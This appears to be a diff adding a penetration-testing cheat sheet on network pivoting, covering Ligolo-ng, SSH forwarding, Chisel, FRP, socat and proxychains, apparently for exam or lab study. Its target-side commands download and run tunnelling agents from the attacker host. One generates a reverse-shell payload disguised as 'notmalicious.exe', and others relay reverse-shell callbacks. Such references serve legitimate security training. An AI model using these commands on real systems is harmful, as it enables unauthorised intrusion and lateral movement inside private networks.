@@ -1,0 +1,113 @@
+^Ligolo notes:Create TUN interface on Kali first with sudo ip tuntap add
+^Ligolo notes:Start ligolo-proxy with selfcert flag to generate certificate
+^Ligolo notes:Transfer agent to target and connect back to Kali
+^Ligolo notes:Use session and tunnel_start after agent connects
+^Ligolo notes:Add routes for target networks with sudo ip route add
+^Ligolo notes:In the AD set, you WILL need to pivot. The DC is not directly accessible.
+^Ligolo notes:Ligolo-ng is the modern standard. Master it before the exam.
+^Ligolo notes:After agent connects, add routes for the internal network. Then treat targets as local.
+^Ligolo notes:Use TCP connect scans through Ligolo, and prefer --unprivileged/-sT when scanning routed internal targets.
+^SSH notes:Local port forwarding forwards local port to remote service (-L)
+^SSH notes:Remote port forwarding exposes local service on remote server (-R)
+^SSH notes:Dynamic port forwarding creates SOCKS proxy (-D)
+^SSH notes:SSH tunneling works when you have SSH access. Use -D for a full SOCKS proxy.
+^Chisel notes:Can create reverse SOCKS proxy for internal network access
+^Chisel notes:Can forward individual ports with R: syntax
+^Chisel notes:When SSH is not available, Chisel is your best friend for reverse SOCKS.
+^Proxychains notes:Add SOCKS5 proxy to /etc/proxychains4.conf
+^Proxychains notes:Use proxychains4 with tools that support TCP (nmap, smbclient, etc.)
+^Proxychains notes:Remember: proxychains only works with TCP, not ICMP. Use -sT with nmap.
+^Socat notes:Can forward ports and relay traffic
+^Frp notes:Fast Reverse Proxy for complex tunneling scenarios
+^Reminder:If you need a clean pivot in labs/exam, start with Ligolo (agent + proxy) → run: Ligolo
+^Reminder:If you have SSH creds and need local port forward to access internal service → run: SSH Local Forward
+^Reminder:If you need to expose an internal service back to Kali (reverse forward) → run: SSH Remote Forward
+^Reminder:If you need a SOCKS proxy for proxychains/browsing, use dynamic forward → run: SSH Dynamic Forward
+^Reminder:If you need to hop through a bastion/jump host → run: SSH Jump Host
+^Reminder:If you need per-command proxying through SSH, use ProxyCommand → run: SSH Proxy Command
+^Reminder:If you want reusable SSH tunnel profiles, use SSH config snippets → run: SSH Config
+^Reminder:If SSH is not possible, use Chisel for reverse tunnels and SOCKS pivots → run: Chisel
+^Reminder:If you need a more featureful reverse proxy framework, use FRP → run: FRP
+^Reminder:If you need simple TCP relays/port forwards on Linux targets, use socat → run: Socat
+^Reminder:If you set up a SOCKS proxy, route tools via proxychains → run: Proxychains
+^Reminder:First foothold achieved. Check for new network interfaces → run: Network Discovery
+^Reminder:New network found. Need to pivot to reach it → run: Ligolo Setup (if you can transfer agent)
+^Reminder:If you can't transfer files but have SSH, use SSH remote forwarding → run: SSH Remote Forward
+^Reminder:Once tunnel is up, route tools through it → run: Proxychains Usage
+^Reminder:Scan the new internal network through your tunnel → run: Pivoted Scanning
+^Reminder:Access services on the internal network as if they were local → run: Pivoted Service Access
+
+Network Discovery:ip addr show # Linux: show all interfaces; target-machine
+Network Discovery:ip route show # Linux: show routing table; target-machine
+Network Discovery:ipconfig /all # Windows: show all interfaces; target-machine
+Network Discovery:route print # Windows: show routing table; target-machine
+Network Discovery:arp -a # Show ARP cache to find other live hosts; target-machine
+Ligolo:sudo ip tuntap add user kali mode tun ligolo && sudo ip link set ligolo up # Create TUN interface for Ligolo; kali-machine
+Ligolo:interface_create --name <interface> #create named Ligolo TUN interface in modern Ligolo console; kali-machine
+Ligolo:sudo ip link set ligolo mtu 1360 # Set MTU to avoid fragmentation issues; kali-machine
+Ligolo:cd /home/kali/Tools && sudo ligolo-proxy -selfcert # Start Ligolo proxy with self-signed cert; kali-machine
+Ligolo:cd /home/kali/Tools && sudo ./ligolo-proxy -selfcert -laddr 0.0.0.0:11601 #start Ligolo proxy listener with self-signed certificate on Kali; kali-machine
+Ligolo:./ligolo-proxy -autocert # Auto-generate certificate; kali-machine
+Ligolo:certificate_fingerprint #display Ligolo certificate fingerprint for safer agent connection without ignore-cert; kali-machine
+Ligolo:certutil -f -urlcache -split http://<kali>:80/agent.exe # Download Windows agent; target-machine
+Ligolo:wget http://<kali>:80/agent && chmod +x agent # Download Linux agent; target-machine
+Ligolo:.\agent.exe -connect <kali>:11601 -ignore-cert # Connect Windows agent to proxy; target-machine
+Ligolo:.\agent.exe -connect <kali>:11601 -accept-fingerprint <hash> #connect Windows Ligolo agent to proxy using expected certificate fingerprint; target-machine
+Ligolo:Start-Job -ScriptBlock { C:\Windows\Temp\agent.exe -connect <kali>:11601 -ignore-cert } #run Ligolo agent in background from PowerShell when you need the shell back; target-machine
+Ligolo:./agent -connect <kali>:11601 -ignore-cert # Connect Linux agent to proxy; target-machine
+Ligolo:session # Select agent session in Ligolo console; kali-machine
+Ligolo:session 1 # Select specific session by number; kali-machine
+Ligolo:tunnel_start # Start tunnel for selected session; kali-machine
+Ligolo:tunnel_start --tun <interface> #start Ligolo tunnel using specified named interface; kali-machine
+Ligolo:msfvenom -p <payload> LHOST=<kali> LPORT=1234 -f exe -o notmalicious.exe #generate reverse shell payload executable to be used with Ligolo pivoting for callback into attacker machine; kali-machine
+Ligolo:listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:<kaliPort> # relay reverse shell callback from internal host through selected Ligolo pivot session; kali-machine
+Ligolo:listener_add --addr 0.0.0.0:<port> --to 127.0.0.1:<port> --tcp # relay reverse shell callback from internal host through selected Ligolo pivot session; kali-machine
+Ligolo:interface_add_route --name <interface> --route <target> #add internal subnet route to named Ligolo interface; kali-machine
+Ligolo:sudo ip route add 172.16.1.0/24 dev ligolo # Add route for target network; kali-machine
+Ligolo:sudo ip route add 10.10.0.0/16 dev ligolo # Add route for another network; kali-machine
+Ligolo:sudo ip route add 240.0.0.1/32 dev ligolo # Add route for target localhost access; kali-machine
+Ligolo:ip route | grep ligolo # Verify routes added; kali-machine
+Ligolo:sudo ip link set ligolo down && sudo ip tuntap del dev ligolo mode tun # Remove TUN interface; kali-machine
+SSH Local Forward:ssh -L <kaliPort>:127.0.0.1:<internal_port> <user>@<target> -p <port> # Forward remote port to local; kali-machine
+SSH Local Forward:ssh -L <kaliPort>:<internal_ip>:<internal_port> <user>@<target> # Forward to specific internal IP; kali-machine
+SSH Local Forward:ssh -L 0.0.0.0:<kaliPort>:<target>:<port> <user>@<target> -N # Bind on all interfaces; kali-machine
+SSH Local Forward:ssh -L <kaliPort>:localhost:<port> <user>@<target> -fN # Run in background; kali-machine
+SSH Remote Forward:ssh -R <remotePort>:localhost:<localPort> <user>@<target> # Expose local port on remote; kali-machine
+SSH Remote Forward:ssh -R 0.0.0.0:<remotePort>:<internal_ip>:<internal_port> <user>@<target> # Expose internal service; kali-machine
+SSH Remote Forward:ssh -R 1080 <user>@<kali> -N # Reverse SOCKS proxy; target-machine
+SSH Dynamic Forward:ssh -D <kaliPort> <user>@<target> # Create SOCKS proxy on Kali; kali-machine
+SSH Dynamic Forward:ssh -D 1080 <user>@<target> -fN # Run SOCKS proxy in background; kali-machine
+SSH Jump Host:ssh -J <user>@<jump_host> <user>@<target> # Jump through intermediate host; kali-machine
+SSH Jump Host:ssh -J user1@host1,user2@host2 user@target # Multiple jump hosts; kali-machine
+SSH Jump Host:ssh -L <kaliPort>:<target>:<port> -J <user>@<jump> <user>@<target> # Forward with jump host; kali-machine
+SSH Proxy Command:ssh -o ProxyCommand="nc -X 5 -x <proxy>:<port> %h %p" <user>@<target> # SSH through SOCKS proxy; kali-machine
+SSH Proxy Command:ssh -o ProxyCommand="connect-proxy -S <proxy>:<port> %h %p" <user>@<target> # SSH through SOCKS with connect-proxy; kali-machine
+SSH Proxy Command:ssh -o ProxyCommand="corkscrew <http_proxy> <port> %h %p" <user>@<target> # SSH through HTTP proxy; kali-machine
+SSH Config:cat ~/.ssh/config # SSH config file for persistent settings; kali-machine
+SSH Config:echo "Host *\n    ProxyCommand nc -X 5 -x localhost:1080 %h %p" >> ~/.ssh/config # Add SOCKS proxy to config; kali-machine
+Chisel:chisel server -p 8000 --reverse # Start chisel server in reverse mode; kali-machine
+Chisel:chisel server -p 8000 --reverse --socks5 # Start with SOCKS5 enabled; kali-machine
+Chisel:chisel server -p 8000 --reverse --auth user:pass # Add authentication; kali-machine
+Chisel:powershell -c wget http://<kali>:<kaliPort>/chisel.exe -outfile c.exe # Download chisel on Windows; target-machine
+Chisel:.\chisel.exe client <kali>:8000 R:socks # Windows client reverse SOCKS; target-machine
+Chisel:./chisel client <kali>:8000 R:socks # Linux client reverse SOCKS; target-machine
+Chisel:.\chisel.exe client <kali>:8000 R:8001:127.0.0.1:<internal_port> # Forward specific port; target-machine
+Chisel:.\chisel.exe client <kali>:8000 R:8001:<target>:<port> # Forward to specific target; target-machine
+Chisel:.\chisel.exe client <kali>:8000 R:8001:localhost:3389 # Forward RDP port; target-machine
+Chisel:echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf # Add chisel SOCKS to proxychains; kali-machine
+Chisel:proxychains4 nmap -sT -Pn 172.16.1.0/24 # Scan internal network through SOCKS; kali-machine
+Chisel:proxychains4 smbclient -L //172.16.1.10 -U user # Access SMB through proxy; kali-machine
+FRP:./frps -c frps.ini # Start FRP server with config; kali-machine
+FRP:cat frps.ini # [common] bind_port = 7000; kali-machine
+FRP:./frpc -c frpc.ini # Start FRP client; target-machine
+FRP:cat frpc.ini # [common] server_addr = <kali> server_port = 7000 [socks5] type = tcp remote_port = 1080 plugin = socks5; target-machine
+Socat:socat TCP-LISTEN:<kaliPort>,fork TCP:<target>:<port> & # Simple port forward; kali-machine
+Socat:socat TCP-LISTEN:<port>,fork TCP:<internal_ip>:<internal_port> & # Forward to internal IP; target-machine
+Socat:socat TCP-LISTEN:8080,fork,reuseaddr SOCKS4A:127.0.0.1:<internal_ip>:80,socksport=1080 # SOCKS-aware forwarding; target-machine
+Socat:socat OPENSSL-LISTEN:<port>,cert=server.pem,verify=0,fork TCP:<target>:<port> # SSL tunnel; kali-machine
+Proxychains:echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf # Add SOCKS5 proxy; kali-machine
+Proxychains:echo 'http 127.0.0.1 8080' | sudo tee -a /etc/proxychains4.conf # Add HTTP proxy; kali-machine
+Proxychains:sudo sed -i 's/^socks4/# socks4/' /etc/proxychains4.conf # Comment out socks4; kali-machine
+Proxychains:proxychains4 nmap -sT -Pn <target> # Run nmap through proxy; kali-machine
+Proxychains:proxychains4 xfreerdp /v:<target> # RDP through proxy; kali-machine
+Proxychains:proxychains4 smbclient -L //<target> -U user # SMB through proxy; kali-machine
